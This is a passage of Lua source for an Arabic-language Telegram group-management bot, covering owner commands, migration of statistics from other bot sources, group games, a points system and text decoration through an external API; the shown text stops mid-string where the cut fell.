if text == 'رفع النسخه' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
add_file(msg,msg.chat_id_,ID_FILE,File_Name)
end end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end end
--     By Developer Faeder     -- 
if text == 'نقل احصائيات تشاكي' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
local Users = faederdx1:smembers(FAEDER.."Tshake:UsersBot")
local Groups = faederdx1:smembers(FAEDER..'Tshake:Chek:Groups') 
for i = 1, #Groups do
faederdx1:sadd(FAEDER..'bot:groups',Groups[i])  
faederdx1:sadd("faeder:addg"..bot_id,Groups[i])  
faederdx1:set(FAEDER.."bot:enable:"..Groups[i],true)
faederdx1:setex(FAEDER.."bot:charge:"..Groups[i],86400,true)
local list1 = faederdx1:smembers(FAEDER..'Tshake:Basic:Constructor'..Groups[i])
print(#list1)
for k,v in pairs(list1) do
faederdx1:sadd(FAEDER.."bot:monsh:"..Groups[i], v)
end
local list2 = faederdx1:smembers(FAEDER..'Tshake:Constructor'..Groups[i])
print(#list2)
for k,v in pairs(list2) do
faederdx1:sadd(FAEDER.."bot:monsh2:"..Groups[i], v)
end
local list3 = faederdx1:smembers(FAEDER..'Tshake:Manager'..Groups[i])
print(#list3)
for k,v in pairs(list3) do
faederdx1:sadd(FAEDER.."bot:owners:"..Groups[i], v)
end
local list4 = faederdx1:smembers(FAEDER..'Tshake:Mod:User'..Groups[i])
print(#list4)
for k,v in pairs(list4) do
faederdx1:sadd(FAEDER.."bot:momod:"..Groups[i], v)
end
end
for i = 1, #Users do
faederdx1:sadd(FAEDER..'bot:userss',Users[i])  
end
faederdx(msg.chat_id_, msg.id_, 1,'↫ الحاله : نقل الاحصائيات \n         ───────────────\n↫ تم نقل : '..#Groups..' قروب \n↫ تم نقل : '..#Users..' مشترك \n↫ تم نقل المنشئين الاساسيين والثانويين \n↫ تم نقل المدراء والادمنيه لكل المجموعات \n         ───────────────\n↫ التنصيب السابق للبوت { سورس تشاكي } ', "md")
end
if text == 'نقل احصائيات الزعيم' and tonumber(msg.sender_user_id_) == tonumber(bot_owner) then   
local Users = faederdx1:smembers(FAEDER..'users')
local Groups = faederdx1:smembers(FAEDER..'group:ids') 
for i = 1, #Groups do
faederdx1:sadd(FAEDER..'bot:groups',Groups[i])  
faederdx1:sadd("faeder:addg"..bot_id,Groups[i])  
faederdx1:set(FAEDER.."bot:enable:"..Groups[i],true)
faederdx1:setex(FAEDER.."bot:charge:"..Groups[i],86400,true)
local list1 = faederdx1:smembers(FAEDER..':MONSHA_Group:'..Groups[i])
print(#list1)
for k,v in pairs(list1) do
faederdx1:sadd(FAEDER.."bot:monsh:"..Groups[i], v)
end
local list2 = faederdx1:smembers(FAEDER..':MONSHA_BOT:'..Groups[i])
print(#list2)
for k,v in pairs(list2) do
faederdx1:sadd(FAEDER.."bot:monsh2:"..Groups[i], v)
end
local list3 = faederdx1:smembers(FAEDER..'owners:'..Groups[i])
print(#list3)
for k,v in pairs(list3) do
faederdx1:sadd(FAEDER.."bot:owners:"..Groups[i], v)
end
local list4 = faederdx1:smembers(FAEDER..'owners:'..Groups[i])
print(#list4)
for k,v in pairs(list4) do
faederdx1:sadd(FAEDER.."bot:momod:"..Groups[i], v)
end
end
for i = 1, #Users do
faederdx1:sadd(FAEDER..'bot:userss',Users[i])  
end
faederdx(msg.chat_id_, msg.id_, 1,'↫ الحاله : نقل الاحصائيات \n         ───────────────\n↫ تم نقل : '..#Groups..' قروب \n↫ تم نقل : '..#Users..' مشترك \n↫ تم نقل المنشئين الاساسيين والثانويين \n↫ تم نقل المدراء والادمنيه لكل المجموعات \n         ───────────────\n↫ التنصيب السابق للبوت { سورس الزعيم } ', "md")
end
--     By Developer Faeder     -- 
if text and text:match("مين ضافني") or text:match("منو ضافني هنا") then
if not faederdx1:get(FAEDER..'Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
faederdx(msg.chat_id_, msg.id_, 1, '↫ فله يعني ها انت منشئ المجموعه وتقول من ضافني .', 1, 'md')
return false
end
local Added_Me = faederdx1:get(FAEDER.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = '*↫ الشخص الذي ضافك هو* ← '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil) else
faederdx(msg.chat_id_, msg.id_, 1, '↫ انت دخلت عبر الرابط .', 1, 'md')
end end,nil) else
faederdx(msg.chat_id_, msg.id_, 1, '↫ هذا الامر معطل من قبل المدراء .', 1, 'md')
end end 
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then  
if text and text:match("^(%d+)$") then
local NUM = text:match("^(%d+)$")
if tonumber(NUM) > 6 then
faederdx( msg.chat_id_, msg.id_, 1,"*↫ يوجد فقط { 6 } اختيارات ارسل اختيارك مره اخرى .*\n", 1, "md")
return false  end 
local GETNUM = faederdx1:get(FAEDER.."GAMES"..msg.chat_id_)
if tonumber(NUM) == tonumber(GETNUM) then
faederdx1:del(FAEDER.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
faederdx( msg.chat_id_, msg.id_, 1,'\n*↫ مبروك لقد ربحت  \n↫ المحيبس باليد رقم { '..NUM..' } \n↫ حصلت على {  5 } نقاط يمكن استبدالها برسائل ', 1, "md")
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_,5)  
elseif tonumber(NUM) ~= tonumber(GETNUM) then
faederdx1:del(FAEDER.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_)   
faederdx( msg.chat_id_, msg.id_, 1,'\n*↫ للاسف لقد خسرت  \n↫ المحيبس باليد رقم { '..GETNUM..' } \n↫ حاول مره اخرى للعثور على المحيبس  *', 1, "md")
end end end
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER.."bot:support:link" .. msg.sender_user_id_) then
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local glink = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
local hash = "bot:supports:link"
faederdx1:set(FAEDER..hash, glink)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ رابط قروب الدعم ", 1, "md")
faederdx1:del(FAEDER.."bot:support:link" .. msg.sender_user_id_)
elseif msg.content_.text_:match("^@(.*)[Bb][Oo][Tt]$") or msg.content_.text_:match("^@(.*)_[Bb][Oo][Tt]$") then
local bID = msg.content_.text_:match("@(.*)")
local hash = "bot:supports:link"
faederdx1:set(FAEDER..hash, bID)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ معرف الدعم ", 1, "md")
faederdx1:del(FAEDER.."bot:support:link" .. msg.sender_user_id_)
end end
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER..'faeder4'..msg.sender_user_id_) then
faederdx1:del(FAEDER..'faeder4'..msg.sender_user_id_)
local url , res = https.request('https://api.telegram.org/bot'..tokenbot..'/getChatAdministrators?chat_id='..msg.content_.text_..'')
local data = json:decode(url)
if res == 400 then
if data.description == "Bad Request: supergroup members are unavailable" then 
faederdx(msg.chat_id_,msg.id_, 1, "*↫ لم ترفعني ادمن في قناتك ارفعني اولا *\n", 1 , "md")
return false 
elseif data.description == "Bad Request: chat not found" then 
faederdx(msg.chat_id_,msg.id_, 1, "*↫ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
return false
end end 
if not msg.content_.text_ then
faederdx(msg.chat_id_,msg.id_, 1, "*↫ هذا المعرف ليس تابع لقناة *\n", 1 , "md")
return false
end
local CH_BOT = msg.content_.text_:match("(.*)")
faederdx1:set(FAEDER..'faeder3',CH_BOT)
faederdx(msg.chat_id_,msg.id_, 1, "↫ تم حفظ القناة \n↫ قم بتفعيل الاشتراك الاجباري الان \n", 1 , "html")
return false
end
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
faederdx1:del(FAEDER.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local nerkh = msg.content_.text_:match("(.*)")
faederdx1:set(FAEDER.."nerkh", nerkh)
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ كليشه المطور ", 1, "md")
end
 --     By Developer Faeder     -- 
if text and text:match("^(.*)$") then
local faeder = faederdx1:get('faeder:'..bot_id..'namebot'..msg.sender_user_id_..'')
if faeder == 'msg' then
faederdx(msg.chat_id_, msg.id_, 1, "↫ تم حفظ اسم البوت الجديد ", 1, "md")
faederdx1:set('faeder:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
faederdx1:set('faeder:'..bot_id..'name_bot', text)
return false 
end end
--     By Developer Faeder     -- 
if faederdx1:get(FAEDER..'bot:cmds'..msg.chat_id_) and not is_momod(msg.sender_user_id_, msg.chat_id_) then
print("Return False [Lock] [Cmd]")
else  
--     By Developer Faeder     -- 
 if text:match("^الرابط$") and faeder11(msg) then
if not faederdx1:get(FAEDER.."bot:tt:link:"..msg.chat_id_) then 
local link = faederdx1:get(FAEDER.."bot:group:link"..msg.chat_id_)
if link then
faederdx(msg.chat_id_,msg.id_,"[هذا رابط القروب]("..link..")")
else 
faederdx(msg.chat_id_, msg.id_, 1, '↫ لم يتم حفظ رابط المجموعه ارسل لي (ضع رابط) ليتم حفظه 📥 ', 1, 'md')
end else
faederdx(msg.chat_id_, msg.id_, 1, '↫ الرابط معطل لا يمكن ارساله ', 1, 'md')
end end
if text and text:match("^القوانين$") or text and text:match("^قوانين$") then
local rules = faederdx1:get(FAEDER..'bot:rules'..msg.chat_id_)
if rules then
faederdx(msg.chat_id_, msg.id_, 1, rules, 1, nil)
else
faederdx(msg.chat_id_, msg.id_, 1, '↫ لم يتم وضع قوانين ', 1, 'md')
end end
--     By Developer Faeder     --
if text == "نسبه الحب" and faeder11(msg) then
faederdx1:set(FAEDER..'nsba'..msg.chat_id_..msg.sender_user_id_,'Check')
faeder = '↫ ارسل اسمك واسم الشخص الاخر \n↫ مثال :- لاكس ولاكسه '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end
if text and text ~="نسبه الحب"  and faederdx1:get(FAEDER..'nsba'..msg.chat_id_..msg.sender_user_id_) == 'Check' then
tt = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","3","8","3","6","0",};
rr = tt[math.random(#tt)]
faeder2 = '↫ نسبه حب '..text..' هي : '..rr..'%'
faederdx(msg.chat_id_, msg.id_, 1,faeder2, 1, 'md')
faederdx1:del(FAEDER..'nsba'..msg.chat_id_..msg.sender_user_id_)
end
--     By Developer Faeder     --
if text and text:match("^احسب (.*)$") and faeder11(msg) or text and text:match("^عمري (.*)$") and faeder11(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge)
t = Age.ok.abs
faederdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
--     By Developer Faeder     -- 
if text and text:match("^برج (.*)$") and faeder11(msg)  or text and text:match("^برجي (.*)$") and faeder11(msg) then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs  
faederdx(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
if faederdx1:get(FAEDER..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_) then 
if text == 'الغاء' then 
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم الغاء امر الزخرفه ', 1, 'md')
faederdx1:del(FAEDER..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
return false  
end 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(text)) 
Zrf = JSON.decode(UrlZrf) 
t = "↫ قائمة الزخرفه \n         ───────────────\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.." `"..v.."` \n"
end
faederdx(msg.chat_id_, msg.id_, 1, t, 1, 'md')
faederdx1:del(FAEDER..'Zrf:add'..msg.chat_id_..''..msg.sender_user_id_)
return false   
end
--     By Developer Faeder     -- 
if text == 'زخرفه' and faeder11(msg) or text == 'الزخرفه' and faeder11(msg)  then  
faederdx1:setex(FAEDER.."Zrf:add"..msg.chat_id_..""..msg.sender_user_id_,10000,true)
faederdx(msg.chat_id_, msg.id_, 1, '↫  لي الكلمه لزخرفتها \n↫  الزخرفه باللغه : { en } ~ { ar } ', 1, 'md')
end
--     By Developer Faeder     -- 
if text and text:match("^زخرفه (.*)$") or text and text:match("^زخرف (.*)$") then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "↫ قائمة الزخرفه \n         ───────────────\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.." `"..v.."` \n"
end
faederdx(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
--     By Developer Faeder     -- 
if text == 'دزwewetwetwe' or text == 'دزمها' or text == 'دي ' then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then local faeder = { "احترام شوي","الاخلاق مثل الارزاق غني وفقير "}  faederdx12 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faederdx12] , 1, 'md') end end
if text == 'اكشسبهتشسبهمتشسمبهشسبتهك' or text == 'شسهبخاشسب' or text == 'سيهبايباسيبمي' or text == 'تاتنانتشساب' or text == 'منيبتسينب' or text == 'امسشباشسمب' or text == 'صشح9قعع93' then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "شعور متبادل" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end
if text == 'زشسبشبمشسبمشسبتشسواج' or text == 'شسهبخاشسب' or text == 'سيهبايباسيبمي' or text == 'تاتنانتشساب' or text == 'منيبتسينب' or text == 'امسشباشسمب' or text == 'صشح9قعع93' then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "↫ أهلاً عزيزي\n↫ تم زواجكم الاثنين بنجاح\n↫ الان يمكنكم أخذ راحتكم" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end
if text == 'اشسبشسبشسبشسبشسبحبك' or text == 'لفيو' or text == 'احبكك' or text == 'احبككك' or text == 'احبكككك' or text == 'احبككككك' or text == 'ياخي احبك' or text == 'احب' or text == 'احبككككككككك' then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then  local faeder = {"‏احببتُك بطريقه لا يعرفها غيري .","وخالقي احببتك أكثر من الحب .","احببتك بقلب باع الجميع وأكتفى بك .","احببتك حتى انني بت اراك الجميع"} faederdx12 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faederdx12] , 1, 'md') faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end end
if text == 'السلام علشسبشسبشسبشسبشسيكم' or text == 'سلام عليكم' or text == 'سلام'  then if not faederdx1:get(FAEDER..'bot:rep:mute'..msg.chat_id_) then faeder =  "وعليكم السلام والرحمه ارحب" else faeder = '' end faederdx(msg.chat_id_, msg.id_, 1, faeder, 1, 'md') end
if text == 'بوتسيبشسيبشسبشس' and faeder11(msg) then  name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'لاكس')  local faeder = {'ماني راد عليك الا لمن تناديني بأسمي .','يالبى الي يقول بوت ي ناس .','صوتك وانت تنادي جبر خاطر ! .','ياعمر البوت انت .'}  faeder2 = math.random(#faeder) faederdx(msg.chat_id_, msg.id_, 1, faeder[faeder2] , 1, 'md')  end
if (text and text == (faederdx1:get('faeder:'..bot_id..'nameee_bot') or 'لاكeeeس')) then name_bot = (faederdx1:get('faeder:'..bot_id..'name_bot') or 'لاكس') local namebot = {'. امرني .','قول ي عمري','سم ؟','تفضل',' هلا'} name = math.random(#namebot) faederdx(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') return false end
--     By Developer Faeder     -- 
if text =='نقاطي' and faeder11(msg) then 
if tonumber((faederdx1:get(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
faeder0 = '↫ ليس لديك نقاط العب اولا \n↫ للعب ارسل { الالعاب } .'
faederdx(msg.chat_id_, msg.id_, 1,faeder0, 1, 'md')
else
faeder = '↫ لديك ('..(faederdx1:get(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..') نقطه '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end end
--     By Developer Faeder     -- 
if text ==  'مسح رسائلي' and faeder11(msg) then
faederdx1:del('faeder:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
faederdx(msg.chat_id_, msg.id_, 1, '↫ تم مسح رسائلك المضافه . ', 1, 'md')
end
--     By Developer Faeder     --
if text == 'سمايلات' then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
faederdx1:del(FAEDER..'bot:l:ids'..msg.chat_id_)
faeder2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈',',','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦',',','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🧼','🎻','🎸',',','🥁','🎹','🎼','🎧','🎤','🎬','🎨','','🎪','🛎','🩸','🎗','🏵','','🧼','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = faeder2[math.random(#faeder2)]
faederdx1:set(FAEDER..'bot:klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞') name = string.gsub(name,'🥖','🥖') name = string.gsub(name,'🥨','🥨') name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚') name = string.gsub(name,'🍳','🍳') name = string.gsub(name,'🥞','🥞') name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩') name = string.gsub(name,'🍗','🍗') name = string.gsub(name,'🍖','🍖') name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔') name = string.gsub(name,'🍟','🍟') name = string.gsub(name,'🍕','🍕') name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙') name = string.gsub(name,'🍼','🍼') name = string.gsub(name,'☕️','☕️') name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤') name = string.gsub(name,'🍶','🍶') name = string.gsub(name,'🍺','🍺') name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎') name = string.gsub(name,'🍐','🍐') name = string.gsub(name,'🍊','🍊') name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌') name = string.gsub(name,'🍉','🍉') name = string.gsub(name,'🍇','🍇') name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈') name = string.gsub(name,'🍒','🍒') name = string.gsub(name,'🍑','🍑') name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥') name = string.gsub(name,'🥝','🥝') name = string.gsub(name,'🍅','🍅') name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑') name = string.gsub(name,'🥦','🥦') name = string.gsub(name,'🥒','🥒') name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽') name = string.gsub(name,'🥕','🥕') name = string.gsub(name,'🥔','🥔') name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐') name = string.gsub(name,'🍻','🍻') name = string.gsub(name,'🏀','🏀') name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈') name = string.gsub(name,'⚾️','⚾️') name = string.gsub(name,'🎾','🎾') name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉') name = string.gsub(name,'🎱','🎱') name = string.gsub(name,'🏓','🏓') name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅') name = string.gsub(name,'🎰','🎰') name = string.gsub(name,'🎮','🎮') name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯') name = string.gsub(name,'🧼','🧼') name = string.gsub(name,'🎻','🎻') name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺') name = string.gsub(name,'🥁','🥁') name = string.gsub(name,'🎹','🎹') name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧') name = string.gsub(name,'🎤','🎤') name = string.gsub(name,'🎬','🎬') name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'','') name = string.gsub(name,'🎪','🎪') name = string.gsub(name,'🛎','🛎') name = string.gsub(name,'🩸','🩸')
name = string.gsub(name,'🎗','🎗') name = string.gsub(name,'🏵','🏵') name = string.gsub(name,'','') name = string.gsub(name,'🧼','🧼')
name = string.gsub(name,'🥌','🥌') name = string.gsub(name,'🛷','🛷') name = string.gsub(name,'🚕','🚕') name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙') name = string.gsub(name,'🚌','🚌') name = string.gsub(name,'🚎','🚎') name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓') name = string.gsub(name,'🚑','🚑') name = string.gsub(name,'🚚','🚚') name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜') name = string.gsub(name,'🇮🇶','🇮🇶') name = string.gsub(name,'⚔️','⚔️') name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮') name = string.gsub(name,'🌡','🌡')  name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱') name = string.gsub(name,'','') name = string.gsub(name,'📓','📒') name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📂','🗂') name = string.gsub(name,'📅','📆') name = string.gsub(name,'📪','📪') name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬') name = string.gsub(name,'📭','📭') name = string.gsub(name,'⏰','⏰') name = string.gsub(name,'📺','📺') name = string.gsub(name,'🎚','🎚') name = string.gsub(name,'☎️','☎️')
faeder = '↫ اول واحد يرسل هذا السمايل  {'..name..'} يربح '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end
if text == ''..(faederdx1:get(FAEDER..'bot:klmos'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:ids'..msg.chat_id_) then
if not faederdx1:get(FAEDER..'bot:l:ids'..msg.chat_id_) then 
faeder = '↫ مبروك لقد ربحت \n↫ للعب مره اخرى ارسل سمايلات . '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
faederdx1:set(FAEDER..'bot:l:ids'..msg.chat_id_,true)
end
--     By Developer Faeder     -- 
if text == 'ترتيب' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
faederdx1:del(FAEDER..'bot:l:id'..msg.chat_id_)
faeder2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = faeder2[math.random(#faeder2)]
faederdx1:set(FAEDER..'bot:klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح') name = string.gsub(name,'سياره','ه ر س ي ا') name = string.gsub(name,'استقبال','ل ب ا ت ق س ا') name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا') name = string.gsub(name,'بزونه','ز و ه ن') name = string.gsub(name,'مطبخ','خ ب ط م') name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه') name = string.gsub(name,'مدرسه','ه م د ر س') name = string.gsub(name,'الوان','ن ا و ا ل') name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا') name = string.gsub(name,'كهوه','ه ك ه و') name = string.gsub(name,'سفينه','ه ن ف ي س') name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح') name = string.gsub(name,'طياره','ر ا ط ي ه') name = string.gsub(name,'رادار','ر ا ر ا د') name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م') name = string.gsub(name,'كهرباء','ر ب ك ه ا ء') name = string.gsub(name,'تفاحه','ح ه ا ت ف') name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س') name = string.gsub(name,'فرنسا','ن ف ر س ا') name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل') name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق') name = string.gsub(name,'بتيته','ب ت ت ي ه') name = string.gsub(name,'لهانه','ه ن ل ه ل') name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب') name = string.gsub(name,'سمكه','ك س م ه') name = string.gsub(name,'ذباب','ب ا ب ذ') name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب') name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت') name = string.gsub(name,'ساحه','ح ا ه س') name = string.gsub(name,'جسر','ر ج س')
faeder = '↫ اول واحد يرتبها  {'..name..'} يربح '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
end
if text == ''..(faederdx1:get(FAEDER..'bot:klmo'..msg.chat_id_) or 'لفاتع')..'' and not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then
if not faederdx1:get(FAEDER..'bot:l:id'..msg.chat_id_) then 
faeder = '↫ مبروك لقد ربحت \n↫ للعب مره اخرى ارسل ترتيب . '
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md')
faederdx1:incrby(FAEDER..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
faederdx1:set(FAEDER..'bot:l:id'..msg.chat_id_,true)
end
--     By Developer Faeder     -- 
if text == 'كت تويت' or text == 'كت' or text == 'تويت' and faeder11(msg) then
if faederdx1:get(FAEDER..'bot:lock_geam'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '↫ الالعاب معطله من قبل الادمن \n↫ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
return "faeder"
end
local faeder = {  "آخر مرة زرت مدينة الملاهي؟",  "آخر مرة أكلت أكلتك المفضّلة؟",  "الوضع الحالي؟\n‏1. سهران\n‏2. طفشان\n‏3. أتأمل",  "آخر شيء ضاع منك؟","كلمة أخيرة لشاغل البال؟","طريقتك المعتادة في التخلّص من الطاقة السلبية؟","شهر من أشهر العام له ذكرى جميلة معك؟","كلمة غريبة من لهجتك ومعناها؟🤓","‏- شيء سمعته عالق في ذهنك هاليومين؟","متى تكره الشخص الذي أمامك حتى لو كنت مِن أشد معجبينه؟","‏- أبرز صفة حسنة في صديقك المقرب؟","هل تشعر أن هنالك مَن يُحبك؟","اذا اكتشفت أن أعز أصدقائك يضمر لك السوءموقفك الصريح؟","أجمل شيء حصل معك خلال هاليوم؟","صِف شعورك وأنت تُحب شخص يُحب غيرك؟👀💔","كلمة لشخص غالي اشتقت إليه؟💕","آخر خبر سعيدمتى وصلك؟","أنا آسف على ....؟","أوصف نفسك بكلمة؟","صريحمشتاق؟","‏- صريحهل سبق وخذلت أحدهم ولو عن غير قصد؟","‏- ماذا ستختار من الكلمات لتعبر لنا عن حياتك التي عشتها الى الآن؟💭","‏- فنان/ة تود لو يدعوكَ على مائدة عشاء؟😁❤","‏- تخيّل شيء قد يحدث في المستقبل؟","‏- للشباب | آخر 